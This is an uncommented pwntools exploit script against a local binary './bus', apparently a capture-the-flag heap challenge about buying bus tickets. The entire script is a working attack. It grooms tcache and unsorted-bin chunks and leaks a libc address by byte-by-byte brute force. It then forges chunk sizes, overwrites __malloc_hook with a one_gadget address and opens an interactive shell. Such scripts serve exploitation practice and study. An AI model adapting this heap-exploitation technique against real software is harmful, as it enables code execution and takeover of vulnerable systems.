#!/usr/bin/env python
from pwn import *
context.log_level='debug'
p=process('./bus')
import struct
ru=lambda s:p.recvuntil(s)
sl=lambda s:p.sendline(s)
sd=lambda s:p.send(s)

def buy(dest,person_num,fin=0):
    ru('What do you want to do:')
    sl('1')
    if fin==0:    
        ru('Where do you want to go: ')
        sl(dest)
        ru('How many people: ')
        sl(str(person_num))

def select_dest(dest):
    ru('What do you want to do:')
    sl('2')
    ru('Where is your destination:')
    sl(dest)
    line=p.recvline()
    print('========================',line)
    if 'N' in line:
        return False
    else:
        return True

def geton():
    ru('What do you want to do:')
    sl('3')
def gogogo(dest):
    select_dest(dest)
    geton()

def debugf(line):
    gdb.attach(p,line)

# gdb.attach(p)#,'nb d2b\n')

for i in range(33):
    buy(str(i)+'\n',123)

leak='\x7f'
for i in range(4):

    for j in range(15,22):                 # tcache 
        gogogo(str(j))
    gogogo(str(i+1))                      # unsortedbin    

    for j in range(21,14,-1):
        buy(str(j),123)
    buy(str(i+1),123)                  # unsorted bin  1 2 3 4

    if i==4:
        buy('0\n',8+4-i)
        gogogo('14')      
        for j in range(0xc,0x100):        
            payload=p8(j)+leak
            if j==0xa:
                continue
            if select_dest(payload):
                log.success('Ticker check pass')
                leak=payload
                break             
    else:
        buy('0\n',8+4-i)
        gogogo('14') 
        for j in range(0x100): 
            if j==0xa:
                continue
            payload=p8(j)+leak
            if select_dest(payload):
                log.success('Ticker check pass')
                leak=payload
                break
    buy('14',123)
        
leak='\xa0'+leak
leak=u64(leak.ljust(8,'\x00'))
libc_base=leak-0x3ebca0
one_off=0x4f2c5
one_off=0x4f322
one_off=0x10a38c
one=libc_base+one_off
malloc_hook=libc_base+0x3ebc30

for i in range(3):
    gogogo(p8(0x35+i))

for i in range(3):
    buy(((chr(ord('a')+i).ljust(8,'\x00')+'\x91'.ljust(8,'\x00'))*7
    +'aaaa'.ljust(8,'\x00')+'\x91'.ljust(7,'\x00')),123)

debugf('')
buy('0',0x70)

gogogo('a')
gogogo('b')
gogogo('aaaa')

buy('aaaa'.ljust(0x20,'\x00')+p64(malloc_hook),123)

buy('aa',123)
buy(p64(one),123)
p.recvuntil(':')
p.sendline('1')



p.interactive()